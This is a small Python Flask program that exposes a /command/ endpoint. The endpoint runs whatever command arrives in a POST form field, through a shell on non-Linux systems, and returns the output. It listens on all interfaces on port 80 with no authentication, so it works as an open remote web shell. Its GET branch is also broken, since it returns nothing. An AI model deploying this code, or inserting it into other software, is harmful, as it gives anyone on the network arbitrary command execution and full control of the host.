from flask import Flask, request, jsonify
import subprocess
import platform

app = Flask(__name__)

@app.route("/command/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        
        user_input = request.form['command']
        splitted_user_input = user_input.split()
        
        if len(splitted_user_input) > 1:
            command = splitted_user_input
        else:
            command = user_input

        try:
            if platform.system() == "Linux":
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            result = process.communicate()
        except FileNotFoundError:
            result = "Command not Found"
        
        return jsonify(result), 200
    else:
        'Error 404'

# app.run()
app.run(host="0.0.0.0", port=80)